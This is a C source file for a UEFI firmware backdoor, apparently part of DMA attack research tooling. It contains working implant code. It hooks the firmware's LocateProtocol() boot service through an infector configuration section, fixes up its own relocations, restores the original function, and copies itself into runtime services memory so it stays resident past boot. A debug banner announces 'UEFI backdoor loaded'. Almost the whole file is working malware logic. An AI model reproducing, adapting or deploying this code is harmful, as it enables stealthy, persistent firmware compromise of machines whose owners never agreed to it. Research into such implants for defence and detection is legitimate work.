#include <Protocol/LoadedImage.h>
#include <Protocol/DevicePath.h>
#include <Protocol/SerialIo.h>

#include <Library/UefiDriverEntryPoint.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/DebugLib.h>
#include <Library/DevicePathLib.h>
#include <Library/UefiRuntimeLib.h>
#include <Library/SynchronizationLib.h>

#include <IndustryStandard/PeImage.h>

#include "../config.h"

#include "common.h"
#include "printf.h"
#include "serial.h"
#include "debug.h"
#include "loader.h"
#include "ovmf.h"
#include "DmaBackdoorSimple.h"
#include "asm/common_asm.h"

#pragma warning(disable: 4054)
#pragma warning(disable: 4055)
#pragma warning(disable: 4305)

#pragma section(".conf", read, write)

EFI_STATUS 
EFIAPI
_ModuleEntryPoint(
    EFI_HANDLE ImageHandle,
    EFI_SYSTEM_TABLE *SystemTable
); 

EFI_STATUS
EFIAPI
BackdoorEntryInfected(
    EFI_GUID *Protocol, VOID *Registration, VOID **Interface
);

// PE image section with information for infector
__declspec(allocate(".conf")) INFECTOR_CONFIG m_InfectorConfig = 
{ 
    // address of LocateProtocol() hook handler
    (UINT64)&BackdoorEntryInfected,

    // address of original LocateProtocol() function
    0,

    // address of EFI_SYSTEM_TABLE
    0
};

PINFECTOR_STATUS m_InfectorStatus = (PINFECTOR_STATUS)(STATUS_ADDR);

VOID *m_ImageBase = NULL;
EFI_BOOT_SERVICES *m_BS = NULL;

// console I/O interface for debug messages
EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *m_TextOutput = NULL; 
//--------------------------------------------------------------------------------------
void ConsolePrint(char *Message)
{
    UINTN Len = strlen(Message), i = 0;

    if (m_TextOutput)
    {        
        for (i = 0; i < Len; i += 1)
        {    
            CHAR16 Char[2];        

            Char[0] = (CHAR16)Message[i];
            Char[1] = 0;

            m_TextOutput->OutputString(m_TextOutput, Char);
        }
    }   
}
//--------------------------------------------------------------------------------------
VOID *ImageBaseByAddress(VOID *Addr)
{
    UINTN Offset = 0;
    VOID *Base = (VOID *)ALIGN_DOWN((UINTN)Addr, DEFAULT_EDK_ALIGN);    

    // get current module base by address inside of it
    while (Offset < MAX_IMAGE_SIZE)
    {
        if (*(UINT16 *)Base == EFI_IMAGE_DOS_SIGNATURE ||
            *(UINT16 *)Base == EFI_TE_IMAGE_HEADER_SIGNATURE)
        {
            return Base;
        }

        Base = (VOID *)((UINT8 *)Base - DEFAULT_EDK_ALIGN);
        Offset += DEFAULT_EDK_ALIGN;
    }

    // unable to locate PE/TE header
    return NULL;
}
//--------------------------------------------------------------------------------------
VOID *BackdoorImageRealocate(VOID *Image)
{
    EFI_IMAGE_NT_HEADERS *pHeaders = (EFI_IMAGE_NT_HEADERS *)RVATOVA(
        Image, 
        ((EFI_IMAGE_DOS_HEADER *)Image)->e_lfanew
    );
    
    UINTN PagesCount = (pHeaders->OptionalHeader.SizeOfImage / PAGE_SIZE) + 1;
    EFI_PHYSICAL_ADDRESS Addr = 0;    

    // allocate memory for executable image
    EFI_STATUS Status = m_BS->AllocatePages(
        AllocateAnyPages,
        EfiRuntimeServicesData,
        PagesCount,
        &Addr
    );
    if (Status == EFI_SUCCESS)
    {     
        VOID *Realocated = (VOID *)Addr;

        // copy image to the new location
        m_BS->CopyMem(Realocated, Image, pHeaders->OptionalHeader.SizeOfImage); 

        // update image relocations acording to the new address
        LDR_UPDATE_RELOCS(Realocated, Image, Realocated);

        return Realocated;
    }
    else
    {
        DbgMsg(__FILE__, __LINE__, "AllocatePool() ERROR 0x%x\r\n", Status);
    }
 
    return NULL;
}
//--------------------------------------------------------------------------------------
typedef VOID (* BACKDOOR_ENTRY_RESIDENT)(VOID *Image);

VOID BackdoorEntryResident(VOID *Image)
{    
    m_ImageBase = Image;        

    DbgMsg(__FILE__, __LINE__, __FUNCTION__"()\r\n");

    m_InfectorStatus->Success += 1;
}
//--------------------------------------------------------------------------------------
EFI_STATUS
EFIAPI
BackdoorEntryInfected(EFI_GUID *Protocol, VOID *Registration, VOID **Interface)
{
    EFI_LOCATE_PROTOCOL LocateProtocol = NULL;
    EFI_SYSTEM_TABLE *SystemTable = NULL;

    // get backdoor image base address
    VOID *Base = ImageBaseByAddress(get_addr());
    if (Base == NULL)
    {
        return EFI_SUCCESS;
    }

    // setup correct image relocations
    if (!LdrProcessRelocs(Base, Base))
    {
        return EFI_SUCCESS;   
    }    

    m_ImageBase = Base;  

    LocateProtocol = (EFI_LOCATE_PROTOCOL)m_InfectorConfig.LocateProtocol;
    SystemTable = (EFI_SYSTEM_TABLE *)m_InfectorConfig.SystemTable;    

    // remove LocateProtocol() hook
    SystemTable->BootServices->LocateProtocol = LocateProtocol;

    // call real entry point
    _ModuleEntryPoint(NULL, SystemTable);    

    // call hooked function
    return LocateProtocol(Protocol, Registration, Interface);
}
//--------------------------------------------------------------------------------------
EFI_STATUS 
EFIAPI
_ModuleEntryPoint(
    EFI_HANDLE ImageHandle,
    EFI_SYSTEM_TABLE *SystemTable) 
{
    EFI_STATUS Status = EFI_SUCCESS;    
    VOID *Image = NULL;

    m_BS = SystemTable->BootServices;

#if defined(BACKDOOR_DEBUG_SERIAL)

    // initialize serial port I/O for debug messages
    SerialPortInitialize(SERIAL_PORT_NUM, SERIAL_BAUDRATE);

#endif        

#if defined(BACKDOOR_DEBUG)

    // initialize console I/O
    Status = m_BS->HandleProtocol(
        SystemTable->ConsoleOutHandle,
        &gEfiSimpleTextOutProtocolGuid, 
        (VOID **)&m_TextOutput
    );
    if (Status == EFI_SUCCESS)
    {
        m_TextOutput->SetAttribute(m_TextOutput, EFI_TEXT_ATTR(EFI_WHITE, EFI_RED));
        m_TextOutput->ClearScreen(m_TextOutput);
    }

    DbgMsg(__FILE__, __LINE__, "******************************\r\n");
    DbgMsg(__FILE__, __LINE__, "                              \r\n");
    DbgMsg(__FILE__, __LINE__, "  UEFI backdoor loaded        \r\n");
    DbgMsg(__FILE__, __LINE__, "                              \r\n");
    DbgMsg(__FILE__, __LINE__, "******************************\r\n");

    DbgMsg(
        __FILE__, __LINE__, "Image address is "FPTR"\r\n", 
        m_ImageBase
    );

#endif // BACKDOOR_DEBUG    

    // copy image to the new location
    if ((Image = BackdoorImageRealocate(m_ImageBase)) != NULL)
    {
        BACKDOOR_ENTRY_RESIDENT pEntry = (BACKDOOR_ENTRY_RESIDENT)RVATOVA(
            Image,
            (UINT8 *)BackdoorEntryResident - (UINT8 *)m_ImageBase
        );
        
        DbgMsg(__FILE__, __LINE__, "Resident code base address is "FPTR"\r\n", Image);
        
        // initialize backdoor resident code
        pEntry(Image);
    } 

#if defined(BACKDOOR_DEBUG)

    m_BS->Stall(TO_MICROSECONDS(3));

#endif

    return EFI_SUCCESS;
}
//--------------------------------------------------------------------------------------
// EoF

